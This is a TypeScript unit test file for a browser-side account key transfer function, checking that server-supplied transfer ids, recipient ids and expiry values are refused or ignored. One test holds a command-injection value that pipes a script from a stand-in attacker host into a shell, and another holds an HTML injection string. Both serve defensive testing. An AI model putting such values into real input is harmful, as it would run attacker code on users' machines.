import { afterEach, describe, expect, test } from "bun:test";
import type { ProtocolObject } from "@dotrelay/contracts";
import { stageAccountKeyTransfer } from "./account-keys";

const originalFetch = globalThis.fetch;
afterEach(() => {
  globalThis.fetch = originalFetch;
});

const transferId = new Uint8Array(16).fill(0xab);
const localHex = "ab".repeat(16);
const object = new Map<number, unknown>([
  [48, new Uint8Array([1, 2, 3])],
  [72, 3n],
]) as unknown as ProtocolObject;

const stageWith = async (body: Record<string, unknown>) => {
  globalThis.fetch = (async () =>
    Response.json(body, { status: 201 })) as unknown as typeof fetch;
  return stageAccountKeyTransfer(
    { origin: "https://api.example", deviceId: "device" },
    "operation",
    { object, transferId },
    {
      recipientDeviceId: "00000000-0000-4000-8000-000000000002",
      expiresAt: "2026-11-15T12:00:00.000Z",
    },
  );
};

describe("stageAccountKeyTransfer", () => {
  test("reports the transfer id this browser created", async () => {
    const staged = await stageWith({
      transferId: localHex,
      recipientDeviceId: "00000000-0000-4000-8000-000000000002",
      expiresAt: "2026-11-15T12:00:00.000Z",
    });
    expect(staged.transferId).toBe(localHex);
  });

  test("refuses a server-supplied transfer id that differs from the local one", async () => {
    // The id is shown inside a command the user copies into a shell.
    await expect(
      stageWith({
        transferId: "x; curl https://attacker.example | sh",
        recipientDeviceId: "00000000-0000-4000-8000-000000000002",
        expiresAt: "2026-11-15T12:00:00.000Z",
      }),
    ).rejects.toThrow();
  });

  test("never echoes a server-chosen recipient or an unparsable expiry", async () => {
    const staged = await stageWith({
      transferId: localHex,
      recipientDeviceId: "<img src=x>",
      expiresAt: "soon",
    });
    expect(staged.recipientDeviceId).toBe(
      "00000000-0000-4000-8000-000000000002",
    );
    expect(staged.expiresAt).toBe("2026-11-15T12:00:00.000Z");
  });
});
